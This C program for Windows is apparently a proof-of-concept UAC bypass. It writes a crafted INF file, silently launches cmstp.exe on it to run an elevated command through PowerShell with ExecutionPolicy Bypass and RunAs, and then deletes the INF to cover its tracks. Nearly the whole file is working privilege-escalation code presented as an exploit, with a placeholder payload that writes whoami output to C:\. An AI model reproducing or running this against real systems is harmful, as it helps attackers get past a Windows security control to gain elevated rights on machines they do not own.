#include <windows.h>
#include <stdio.h>

int main() {
    // Payload - elevated command
    const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA CMSTPLUA ON 25H2 > C:\\uac_bypassed.txt & timeout 5\"";

    // Create temporary INF file
    HANDLE hFile = CreateFileA("C:\\temp\\bypass.inf", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        const char* inf = "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n"
                          "[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\n"
                          "RunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n"
                          "[RunPreSetupCommandsSection]\r\n"
                          "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process cmd.exe -ArgumentList '/c ";
        DWORD written;
        WriteFile(hFile, inf, (DWORD)strlen(inf), &written, NULL);
        WriteFile(hFile, payload, (DWORD)strlen(payload), &written, NULL);
        const char* end = "' -Verb RunAs\"\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n"
                          "[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n\r\n"
                          "[Strings]\r\nServiceName=\"CMSTPLUA UAC Bypass\"\r\n";
        WriteFile(hFile, end, (DWORD)strlen(end), &written, NULL);
        CloseHandle(hFile);
    }

    // Trigger silently
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\cmstp.exe", "/s C:\\temp\\bypass.inf", NULL, SW_HIDE);

    Sleep(8000);

    // Cleanup
    DeleteFileA("C:\\temp\\bypass.inf");

    printf("[+] CMSTPLUA triggered. Check C:\\ files now.\n");
    return 0;
}
